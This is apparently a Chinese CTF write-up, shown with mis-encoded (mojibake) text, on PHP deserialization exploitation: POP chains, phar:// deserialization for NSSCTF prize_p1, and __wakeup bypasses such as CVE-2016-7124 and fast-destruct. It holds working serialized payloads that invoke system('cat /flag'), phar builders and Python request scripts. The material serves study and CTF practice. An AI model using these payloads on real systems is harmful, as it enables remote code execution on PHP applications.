å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°ä¼šå°†ç¬¬äºŒä¸ªå‚æ•°å½“åšå‡½æ•°ï¼Œè€Œè¯¥å‡½æ•°æœ€å¤šæ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œæ¥å—çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯array_walkçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°æ¥è‡ªarray_walkçš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆè¿™ä¸ªå‚æ•°å¯å†™å¯ä¸å†™ï¼‰è¿™é‡Œä¸å…·ä½“åˆ†æäº†ï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æµ‹è¯•ä¸€ä¸‹ &lt;?php highlight_file(__FILE__); class one { public $year_parm; public $object; public function MeMeMe() { array_walk($this, function ($fn, $prev) { if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { echo 'success'; } }); } } $a = new one(); $a-&gt;year_parm = array('Happy_func'); $a-&gt;MeMeMe(); ?&gt; å¦‚ä¸Šå›¾æ·»åŠ äº†ä¸€ä¸ª$year_parmå˜é‡ï¼Œæˆ‘ä»¬çœ‹è¾“å‡ºå¦‚ä½•ï¼Œå¦‚ä¸‹å›¾ã€‚ ä¹Ÿå°±æ˜¯è¯´å…¶ä¸­çš„$thisä¼šå»éå†å½“å‰å¯¹è±¡çš„æ¯ä¸ªå…¬å…±å±æ€§ï¼Œå³$year_parmä¸$objectï¼Œéšåçš„è‡ªå®šä¹‰functionå‡½æ•°ä¸­fnå˜é‡æ˜¯å±æ€§çš„å€¼ï¼Œprevå˜é‡ä»£è¡¨å±æ€§çš„åå­—ã€‚ å³å¦‚æœä¼ å…¥$a-&gt;year_parm = array(â€˜Happy_funcâ€™);ï¼Œåˆ™array_walkåœ¨è°ƒç”¨çš„æ—¶å€™æ˜¯è¿™æ ·çš„ã€‚ $fn='Happy_func'&amp;$prev='year_parm' è‡³æ­¤æˆ‘ä»¬å¯ä»¥å†™pocäº† &lt;?php class one { public $year_parm = array('Happy_func'); public $object; public function MeMeMe() { array_walk($this, function($fn, $prev){ if ($fn[0] === \"Happy_func\" &amp;&amp; $prev === \"year_parm\") { global $talk; echo \"$talk\".\"&lt;/br&gt;\"; global $flag; echo $flag; } }); } public function __destruct() { @$this-&gt;object-&gt;add(); } public function __toString() { return $this-&gt;object-&gt;string; } } class second { public $filename; protected function addMe() { return \"Wow you have sovled\".$this-&gt;filename; } public function __call($func, $args) { call_user_func([$this, $func.\"Me\"], $args); } } class third { private $string; public function __construct($string) { $this-&gt;string = $string; } public function __get($name) { $var = $this-&gt;$name; $var[$name](); } } $pop = new one(); $pop-&gt;object = new second(); $pop-&gt;object-&gt;filename = new one(); $pop-&gt;object-&gt;filename-&gt;object = new third(array(\"string\"=&gt;[new one(),\"MeMeMe\"])); $a = array($pop, 0); $a = serialize($a); $b = str_replace('i:1;i:0;', 'i:0;i:0;', $a); //echo $b; echo urlencode($b); ?&gt; è§£é‡Šä¸€ä¸‹è¿™é‡Œçš„èµ‹å€¼new third(array(\"string\"=&gt;[new one(),\"MeMeMe\"])); å› ä¸ºè¿™é‡Œæˆ‘ä»¬è°ƒç”¨çš„æ˜¯__getæ–¹æ³•ï¼Œè€Œæ­¤å‰æˆ‘ä»¬æ˜¯è¿™æ ·è°ƒç”¨çš„$this-&gt;object-&gt;string;è¿™é‡Œçš„objectä¸ºthirdå¯¹è±¡å®ä¾‹ï¼Œè¿™æ ·åœ¨è°ƒç”¨getåï¼Œgetå…¶ä¸­çš„$nameå˜é‡çš„å€¼å°±æ˜¯stringï¼ˆå¯ä»¥è‡ªè¡Œæµ‹è¯•éªŒè¯ï¼‰ï¼Œè€Œä¹‹åå­˜åœ¨$var = $this-&gt;$name;è¿™ä¸€è¡Œä»£ç ï¼Œå³$var = $this-&gt;$string;è€Œ$string=[new one(),\"MeMeMe\"]è‡³æ­¤å˜é‡varæˆåŠŸè¢«èµ‹å€¼ä¸ºæ•°ç»„ å°±è¿™ä¸€ä¸ªé¢˜åºŸäº†1ä¸ªå°æ—¶ã€‚ã€‚ã€‚å¤ªèœäº† NSSCTF prize_p1 &lt;?php highlight_file(__FILE__); class getflag { function __destruct() { echo getenv(\"FLAG\"); } } class A { public $config; function __destruct() { if ($this-&gt;config == 'w') { $data = $_POST[0]; if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) { die(\"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\"); } file_put_contents(\"./tmp/a.txt\", $data); } else if ($this-&gt;config == 'r') { $data = $_POST[0]; if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $data)) { die(\"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\"); } echo file_get_contents($data); } } } if (preg_match('/get|flag|post|php|filter|base64|rot13|read|data/i', $_GET[0])) { die(\"æˆ‘çŸ¥é“ä½ æƒ³å¹²å—ï¼Œæˆ‘çš„å»ºè®®æ˜¯ä¸è¦é‚£æ ·åšã€‚\"); } unserialize($_GET[0]); throw new Error(\"é‚£ä¹ˆå°±ä»è¿™é‡Œå¼€å§‹èµ·èˆªå§\"); è¿™é‡Œçœ‹åˆ°getflagç±»ç›´æ¥å°±èƒ½è¾“å‡ºflagä½†æ˜¯åœ¨ååºåˆ—åŒ–ä»¥å‰ï¼Œé€šè¿‡æ­£åˆ™è¿‡æ»¤äº†flagå’Œgetå…³é”®å­—ï¼Œå› æ­¤å¯¹äºç›´æ¥åˆ©ç”¨getflagç±»è¿™ç§åŠæ³•å°±è¡Œä¸é€šäº†ï¼Œè™½ç„¶å¯¹äºè¿™ç§æ­£åˆ™çš„ç»•è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ•°ç»„ï¼Œå°±åƒè¿™æ ·?0[]=XXXï¼Œä½†æ˜¯åé¢çš„å€¼å°±è¢«PHPè§£æä¸ºæ•°ç»„ï¼Œå¯¼è‡´æ— æ³•æ­£å¸¸ååºåˆ—åŒ–ã€‚ å› æ­¤æˆ‘ä»¬åªèƒ½å°†ç›®å…‰æŠ•å‘åˆ°Aç±»ï¼Œå…¶ä¸­ä¾æ—§æ˜¯è¦è§¦å‘ææ„å‡½æ•°ï¼Œæœ‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œä¸€ä¸ªæ˜¯å†™å…¥æ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯è¯»å–æ–‡ä»¶ï¼Œå¹¶ä¸”å‡½æ•°æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„å¯ä»¥é…åˆpharè¿›è¡Œååºåˆ—åŒ–çš„å‡½æ•°ã€‚ é‚£ä¹ˆæ€è·¯æœ‰äº†ï¼šé¦–å…ˆé€šè¿‡æ–‡ä»¶å†™å…¥å‡½æ•°ï¼Œå†™å…¥pharæ•°æ®ï¼ˆå…¶ä¸­çš„æ•°æ®ä¸ºæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„getflagç±»ï¼‰ï¼Œæ¥ç€é€šè¿‡æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œè¯»å–pharæ–‡ä»¶è§¦å‘ååºåˆ—åŒ–ï¼Œæ‹¿åˆ°flagã€‚ æ¥ä¸‹æ¥å…ˆç¼–å†™phar &lt;?php //ini_set(\"phar.readonly\", 0); class getflag { } //@unlink(\"phar.phar\"); $phar = new Phar(\"1.phar\"); //åç¼€åå¿…é¡»ä¸ºphar $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER();?&gt;\"); //è®¾ç½®stub $a = new getflag(); $a = array($a, 0); $phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest $phar-&gt;addFromString(\"test.txt\", \"test\"); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ //ç­¾åè‡ªåŠ¨è®¡ç®— $phar-&gt;stopBuffering(); ?&gt; ä½†è¿™é‡Œå€¼å¾—æ³¨æ„çš„ç‚¹æ˜¯ï¼Œåœ¨pharååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå¦‚ä¸‹å›¾æ ‡è®°å¤„ï¼Œå¯ä»¥çœ‹åˆ°è¿™é‡Œçš„Metadataå±æ€§å¼•ç”¨äº†æˆ‘ä»¬çš„$aï¼Œè¿™ä¼šå¯¼è‡´åœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè§¦å‘é¢˜ç›®çš„å¼‚å¸¸è€Œæ— æ³•è°ƒç”¨ææ„å‡½æ•°ï¼Œå› æ­¤éœ€è¦é‡‡ç”¨ååºåˆ—åŒ–æ•°ç»„ç»•è¿‡ è¿™é‡Œå¯¹ç”Ÿæˆçš„pharæ–‡ä»¶ï¼Œç”¨010æ‰“å¼€åä¿®æ”¹æ•°ç»„ç´¢å¼•ï¼Œä¹‹åéœ€è¦é‡æ–°è®¡ç®—pharç­¾å æ•°ç»„ç»•è¿‡ ä¿®æ”¹æˆåŠŸï¼Œæ¥ä¸‹æ¥å°±æ˜¯ç»•è¿‡æ­£åˆ™äº†ï¼Œè¿™é‡Œé‡‡ç”¨æ•°ç»„ç»•è¿‡ï¼Œæˆ–è€…é€šè¿‡gzipç­‰åè®®å‹ç¼©ä¹Ÿå¯ï¼Œè¿™æ ·å…¶å†…éƒ¨æ•°æ®å°±ä¸æ˜¯æ˜æ–‡äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº†å…³é”®å­—çš„è¿‡æ»¤ã€‚â€“è¿™é‡Œå…ˆç”¨æ•°ç»„ç»•è¿‡ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š import requests import re url=\"http://node4.anna.nssctf.cn:28672/\" ### å†™å…¥pharæ–‡ä»¶ with open(\"phar.phar\",'rb') as f: data1={'0[]':f.read()} #ä¼ æ•°ç»„ç»•è¿‡ï¼Œå€¼å°±æ˜¯phar.pharæ–‡ä»¶çš„å†…å®¹ param1 = {0: 'O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}'} res1 = requests.post(url=url, params=param1,data=data1) ### è¯»pharæ–‡ä»¶ï¼Œè·å–flag param2={0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}'} data2={0:\"phar://tmp/a.txt\"}#pharè§£ææ˜¯çœ‹æ–‡ä»¶æ ¼å¼çš„ï¼Œå¹¶éçœ‹åç¼€å res2=requests.post(url=url,params=param2,data=data2) flag=re.compile('NSSCTF\\{.*?\\}').findall(res2.text) print(flag) å¾—åˆ°flag gzipå‹ç¼©ç»•è¿‡ gzip bzip2 tar zip è¿™å››ä¸ªåç¼€åŒæ ·ä¹Ÿæ”¯æŒphar://è¯»å– import requests import gzip import re url = 'http://node4.anna.nssctf.cn:28672/' with open(\"D:\\\\PphProject\\\\Scripts\\ ewtest.phar\", \"rb\") as f1: phar_zip = gzip.open(\"gzip.zip\", \"wb\") phar_zip.writelines(f1) phar_zip.close() with open(\"phar.zip\", \"rb\") as f2: data1 = { 0:f2.read() } params1 = { 0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"w\";}' } requests.post(url=url, params=params1, data=data1) params2 = { 0:'O:1:\"A\":1:{s:6:\"config\";s:1:\"r\";}' } data2 = { 0:\"phar://tmp/a.txt\" } res = requests.post(url=url, params=params2, data=data2) flag = re.compile('NSSCTF\\{.*?\\}').findall(res.text) print(flag) tarå‹ç¼©ç»•è¿‡ åœ¨guokeå¸ˆå‚…çš„æ–‡ç« ä¸­æœ‰PHPå¯¹taræ–‡ä»¶çš„phar://çš„åº•å±‚å¤„ç†æºç åˆ†æï¼Œå…¶ä¸­æœ‰æ¶‰åŠåˆ°.phar/.metadataè¿™ä¸ªæ–‡ä»¶ï¼Œè¿™é‡Œåªè®²æ€ä¹ˆæ“ä½œ å…ˆæ–°å»ºä¸€ä¸ª.pharæ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»º.metadataæ–‡ä»¶ï¼Œå†…å®¹ç›´æ¥å†™å…¥a:2:{i:0;O:7:\"getflag\":0:{}i:0;N;} å°†æ–‡ä»¶å¤¹æ‹–å…¥Linuxä¸­ï¼Œtar -cf tartest.tar .phar/ç”Ÿæˆæ–°æ–‡ä»¶åå†å¯¹æ–°æ–‡ä»¶gzipä¸€ä¸‹å¾—åˆ°tartest.tar.gzæ–‡ä»¶ï¼Œå†POSTè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œå†è¯»å–è·å¾—flag ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œ.pharåœ¨Linuxä¸­æ˜¾ç¤ºä¸ºéšè—æ–‡ä»¶ï¼Œæ‰€ä»¥æ‹–å…¥åå¯èƒ½ä¼šçœ‹ä¸è§ï¼Œåˆ©ç”¨ls -alå¯ä»¥çœ‹åˆ°ï¼‰ å…·ä½“åŸç†çœ‹å‚è€ƒæ–‡ç«  cve-2016-7124ç»•è¿‡ è¿™ä¸ªæ˜¯æœ€å¸¸è§çš„ï¼Œå°±ç®€å•è¿‡ä¸€ä¸‹ å½±å“èŒƒå›´ï¼š PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 æ­£å¸¸æ¥è¯´åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šå…ˆè°ƒç”¨wakeup()æ–¹æ³•å†è¿›è¡Œunserilize()ï¼Œä½†å¦‚æœåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ï¼Œwakeup()çš„æ‰§è¡Œä¼šè¢«è·³è¿‡ã€‚ ä½†çœ‹äº†ç¯‡æ–‡ç« ï¼Œå‘ç°è¿™é‡Œè¿˜å¤§æœ‰è¯´æ³•ï¼Ÿï¼Ÿï¼Ÿ ç»•è¿‡åŸç†ï¼š ååºåˆ—åŒ–åç”±äºå±æ€§å€¼ä¸ªæ•°ä¸åŒ¹é…ï¼Œè¢«PHPå½“ä½œåƒåœ¾å›æ”¶ã€‚ï¼ˆæœ¬è´¨æ˜¯GCå›æ”¶æœºåˆ¶ï¼‰ï¼Œè¿›ä¸€æ­¥æ¢ç´¢ï¼Œå¦‚æœæ¢æˆç±»åŒ…ç±»çš„æƒ…å†µï¼Œå°±æ˜¯ç±»å±æ€§è¿˜æ˜¯ä¸€ä¸ªç±»ã€‚ //æ­£å¸¸payload O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:3:â€œendâ€;s:1:â€œ1â€;} //å†…éƒ¨ç±»å±æ€§æ•°é‡ä¸ä¸€è‡´ï¼Œåªè§¦å‘å¤–éƒ¨ç±»çš„__destruct() O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:2:{s:3:â€œendâ€;N;}s:3:â€œendâ€;s:1:â€œ1â€;} //å¤–éƒ¨ç±»å±æ€§æ•°é‡ä¸ä¸€è‡´ï¼Œå…ˆå¤–ç±»__destruct()åå†…ç±»__wakeup() O:1:â€œAâ€:3:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:3:â€œendâ€;s:1:â€œ1â€;} åŸç†ï¼š ååºåˆ—åŒ–ï¼Œå®ƒæ˜¯å…ˆä»å¤–é¢å¼€å§‹ååºåˆ—åŒ–ï¼Œè€Œä¸æ˜¯é‡Œé¢ã€‚é€šä¿—è®²ï¼Œå°±æ˜¯ç±»Aé‡Œé¢çš„å±æ€§æ˜¯ç±»Bï¼Œåˆ™å…ˆååºåˆ—åŒ–ç±»Aå†ååºåˆ—åŒ–ç±»Bã€‚ å†…éƒ¨ç±»å±æ€§æ•°é‡ä¸ä¸€è‡´ï¼Œç›´æ¥æŠŠå†…éƒ¨ç±»å½“åƒåœ¾å›æ”¶ï¼Œæ‰€ä»¥ä¸è§¦å‘å†…éƒ¨ç±»__wakeup()ï¼Œåªè§¦å‘å¤–éƒ¨ç±»çš„__destruct()ã€‚ å¤–éƒ¨ç±»å±æ€§æ•°é‡ä¸ä¸€è‡´ï¼Œå¤–éƒ¨ç±»ç›´æ¥è¢«å½“æˆåƒåœ¾å›æ”¶ï¼Œå…ˆè§¦å‘äº†å¤–éƒ¨ç±»__destruct()ï¼Œè€Œå†…éƒ¨ç±»æ­£å¸¸ï¼Œå°±æ­£å¸¸è§¦å‘å†…éƒ¨ç±»__wakeup()ã€‚ è¿™å¬èµ·æ¥åƒfast-destructï¼Œä¸æ˜¯åƒï¼Œå°±æ˜¯åŒä¸€ä¸ªä¸œè¥¿ï¼Œå…¶å®æœ¬è´¨ä¸Šéƒ½æ˜¯PHPçš„GCå›æ”¶æœºåˆ¶ç½¢äº†ã€‚ phpå¼•ç”¨èµ‹å€¼ç»•è¿‡ åœ¨phpé‡Œï¼Œæˆ‘ä»¬å¯ä½¿ç”¨å¼•ç”¨çš„æ–¹å¼è®©ä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè¿™æ ·å¯¹å…¶ä¸­ä¸€ä¸ªå˜é‡æ“ä½œæ—¶ï¼Œå¦ä¸€ä¸ªå˜é‡çš„å€¼ä¹Ÿä¼šéšä¹‹æ”¹å˜ã€‚ æ¯”å¦‚ï¼š &lt;?php function test (&amp;$a){ $x=&amp;$a; $x='123'; } $a='11'; test($a); echo $a; //è¾“å‡º 123 ?&gt; å¯ä»¥çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬è™½ç„¶æœ€åˆ$a=â€˜11â€™ï¼Œä½†ç”±äºæˆ‘ä»¬é€šè¿‡$x=&amp;$aä½¿ä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå†…å­˜åœ°å€äº†ï¼Œæ‰€ä»¥ä½¿$x='123â€™ä¹Ÿå¯¼è‡´$a='123â€™äº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼š &lt;?php class KeyPort{ public $key; public function __destruct() { $this-&gt;key=False; if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup){ echo \"You get it!\"; } } public function __wakeup(){ $this-&gt;wakeup=True; } } if(isset($_POST['pop'])){ @unserialize($_POST['pop']); } ?&gt; å¦‚æœååºåˆ—åŒ–ï¼Œé‚£wakeupå˜é‡ä¸€å®šä¸ºtrueï¼Œé‚£if(!isset($this-&gt;wakeup)||!$this-&gt;wakeup)å°±ä¸å¯èƒ½ç»•è¿‡ï¼Œå¦‚æœæ­¤æ—¶æ— æ³•é€šè¿‡ä¿®æ”¹å±æ€§å€¼ä¸ªæ•°ç»•è¿‡çš„è¯ã€‚å°±å¯ä»¥å°è¯•å¼•ç”¨ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°keyçš„å€¼ä¸ºfalse é‚£å¦‚æœæ­¤æ—¶æˆ‘ä»¬è¿™æ ·å†™ï¼š $this-&gt;key=False; $this-&gt;key=&amp;this-&gt;wakeup //æˆ–è€… $keyport = new KeyPort(); $keyport-&gt;key=&amp;$keyport-&gt;wakeup; å³å¯æˆåŠŸç»•è¿‡ fast-destructç»•è¿‡ å¼•ç”¨ä¸€ä¸‹å¤§ä½¬çš„è§£é‡Šï¼š åœ¨PHPä¸­å¦‚æœå•ç‹¬æ‰§è¡Œunserialize()å‡½æ•°ï¼Œåˆ™ååºåˆ—åŒ–åå¾—åˆ°çš„ç”Ÿå‘½å‘¨æœŸä»…é™äºè¿™ä¸ªå‡½æ•°æ‰§è¡Œçš„ç”Ÿå‘½å‘¨æœŸï¼Œåœ¨æ‰§è¡Œå®Œunserialize()å‡½æ•°æ—¶å°±ä¼šæ‰§è¡Œ__destruct()æ–¹æ³• è€Œå¦‚æœå°†unserialize()å‡½æ•°æ‰§è¡Œåå¾—åˆ°çš„å­—ç¬¦ä¸²èµ‹å€¼ç»™äº†ä¸€ä¸ªå˜é‡ï¼Œåˆ™ååºåˆ—åŒ–çš„å¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸå°±ä¼šå˜é•¿ï¼Œä¼šä¸€ç›´åˆ°å¯¹è±¡è¢«é”€æ¯æ‰æ‰§è¡Œææ„æ–¹æ³• æˆ‘ä»¬å¯ä»¥çœ‹åˆ°DASCTF X GFCTF 2022åæœˆæŒ‘æˆ˜èµ›é‡ŒEasyPOPè¿™é“é¢˜ï¼Œæºç æ˜¯ï¼š &lt;?php highlight_file(__FILE__); error_reporting(0); class fine { private $cmd; private $content; public function __construct($cmd, $content) { $this-&gt;cmd = $cmd; $this-&gt;content = $content; } public function __invoke() { call_user_func($this-&gt;cmd, $this-&gt;content); } public function __wakeup() { $this-&gt;cmd = \"\"; die(\"Go listen to Jay Chou's secret-code! Really nice\"); } } class show { public $ctf; public $time = \"Two and a half years\"; public function __construct($ctf) { $this-&gt;ctf = $ctf; } public function __toString() { return $this-&gt;ctf-&gt;show(); } public function show(): string { return $this-&gt;ctf . \": Duration of practice: \" . $this-&gt;time; } } class sorry { private $name; private $password; public $hint = \"hint is depend on you\"; public $key; public function __construct($name, $password) { $this-&gt;name = $name; $this-&gt;password = $password; } public function __sleep() { $this-&gt;hint = new secret_code(); } public function __get($name) { $name = $this-&gt;key; $name(); } public function __destruct() { if ($this-&gt;password == $this-&gt;name) { echo $this-&gt;hint; } else if ($this-&gt;name = \"jay\") { secret_code::secret(); } else { echo \"This is our code\"; } } public function getPassword() { return $this-&gt;password; } public function setPassword($password): void { $this-&gt;password = $password; } } class secret_code { protected $code; public static function secret() { include_once \"hint.php\"; hint(); } public function __call($name, $arguments) { $num = $name; $this-&gt;$num(); } private function show() { return $this-&gt;code-&gt;secret; } } if (isset($_GET['pop'])) { $a = unserialize($_GET['pop']); $a-&gt;setPassword(md5(mt_rand())); } else { $a = new show(\"Ctfer\"); echo $a-&gt;show(); } å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ªéš¾ç‚¹å°±æ˜¯wakeupçš„ç»•è¿‡ï¼š public function __wakeup() { $this-&gt;cmd = \"\"; die(\"Go listen to Jay Chou's secret-code! Really nice\"); } exp: &lt;?php class sorry { public $name; public $password; public $key; public $hint; } class show { public $ctf; } class secret_code { public $code; } class fine { public $cmd; public $content; public function __construct() { $this-&gt;cmd = 'system'; $this-&gt;content = ' /'; } } $a=new sorry(); $b=new show(); $c=new secret_code(); $d=new fine(); $a-&gt;hint=$b; $b-&gt;ctf=$c; $e=new sorry(); $e-&gt;hint=$d; $c-&gt;code=$e; $e-&gt;key=$d; echo (serialize($a)); #O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:2:\" /\";}s:4:\"hint\";r:10;}}}} ç›´æ¥ä¼ è¿›å»æ¯«æ— ç–‘é—®ä¼šå› ä¸ºdie()è€Œç»ˆæ­¢ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨fast-destructè¿™ä¸ªæŠ€å·§ä½¿destructæå‰å‘ç”Ÿä»¥ç»•è¿‡wakeup()ï¼Œæ¯”å¦‚æˆ‘ä»¬å¯ä»¥å‡å°‘ä¸€ä¸ª} ï¼š ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;}}} æˆ–è€…åœ¨r;10;åé¢åŠ ä¸€ä¸ª1ï¼š ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;1}}}} éƒ½å¯ä»¥å®ç°wakeupç»•è¿‡ï¼Œä¹Ÿæœ‰ä¸‹é¢çš„ç»•è¿‡æ–¹æ³• æœ¬è´¨ä¸Šå°±æ˜¯åˆ©ç”¨GCå›æ”¶æœºåˆ¶ï¼Œæ–¹æ³•æœ‰ä¸¤ç§ï¼Œåˆ é™¤æœ«å°¾çš„èŠ±æ‹¬å·ã€æ•°ç»„å¯¹è±¡å ç”¨æŒ‡é’ˆï¼ˆæ”¹æ•°å­—ï¼‰ $a = new a(); arry = array( arry = array(arry=array(a,â€œ1234â€); result= serialize(result=serialize(result=serialize(arry); echo $result; //æ­£å¸¸payloadï¼š a:2:{i:0;O:1:â€œaâ€:1:{s:1:â€œaâ€;s:3:â€œ123â€;}i:1;s:4:â€œ1234â€;} //åˆ é™¤æœ«å°¾èŠ±æ‹¬å· a:2:{i:0;O:1:â€œaâ€:1:{s:1:â€œaâ€;s:3:â€œ123â€;}i:1;s:4:â€œ1234â€; //æ•°ç»„å¯¹è±¡å ç”¨æŒ‡é’ˆï¼ˆåŠ ç²—éƒ¨åˆ†æ•°ç»„ä¸‹æ ‡å’Œå‰é¢é‡å¤éƒ½æ˜¯0ï¼Œå¯¼è‡´æŒ‡é’ˆå‡ºé—®é¢˜ï¼‰ a:2:{i:0;O:1:â€œaâ€:1:{s:1:â€œaâ€;s:3:â€œ123â€;}i:0;s:4:â€œ1234â€;} å±æ€§é”®é•¿åº¦ä¸åŒ¹é…ç»•è¿‡ ä¹Ÿå« php issue#9618ï¼Œç‰ˆæœ¬æ¡ä»¶ï¼š 7.4.x -7.4.30 8.0.x //æ­£å¸¸payload O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ1â€;} //å¤–éƒ¨ç±»å±æ€§é”®é•¿åº¦å¼‚å¸¸payloadï¼š //å…ˆå¤–ç±»__destruct()åå†…ç±»__wakeup() O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:6:â€œAendâ€;s:1:â€œ1â€;} å±æ€§å€¼çš„é•¿åº¦ä¸åŒ¹é…ç»•è¿‡ //æ­£å¸¸payload O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ1â€;} //å¤–éƒ¨ç±»å±æ€§å€¼é•¿åº¦å¼‚å¸¸payloadï¼š //å…ˆå¤–ç±»__destruct()åå†…ç±»__wakeup() O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:2:â€œ1â€;} O:1:â€œAâ€:2:{s:4:â€œinfoâ€;O:1:â€œBâ€:1:{s:3:â€œendâ€;N;}s:4:â€œAendâ€;s:1:â€œ12â€;} å¯¹æ­¤ç¨å¾®æ€»ç»“ä¸€ä¸‹ï¼Œå‰é¢æˆ‘ä»¬çš„ç»•è¿‡æ–¹æ³•æ— éå°±æ˜¯ä¿®æ”¹æ•°ç»„ç´¢å¼•ã€åˆ é™¤åˆ†å·ã€åˆ é™¤èŠ±æ‹¬å·ã€ä¿®æ”¹å±æ€§å€¼å’Œå±æ€§é”®çš„é•¿åº¦ã€‚æ¥ä¸‹æ¥è®¤çœŸåˆ†æåˆ†ææ˜¯å¦‚ä½•ç»•è¿‡çš„ï¼šè¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯fast-destructçš„æœ¬è´¨æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²æ ¼å¼ä¸å¯¹å¯¼è‡´ååºåˆ—å¤±è´¥åè€Œæˆä¸ºåƒåœ¾æ•°æ®ç„¶åè§¦å‘å¼ºè¡ŒGC å¯¹äºè¿™ä¸ªpayload //åˆ é™¤èŠ±æ‹¬å· ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;}}} //æœ«ä½æ·»åŠ æ•°å­—1 ?pop=O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";N;s:4:\"hint\";O:4:\"show\":1:{s:3:\"ctf\";O:11:\"secret_code\":1:{s:4:\"code\";O:5:\"sorry\":4:{s:4:\"name\";N;s:8:\"password\";N;s:3:\"key\";O:4:\"fine\":2:{s:3:\"cmd\";s:6:\"system\";s:7:\"content\";s:9:\"cat /flag\";}s:4:\"hint\";r:10;1}}}} 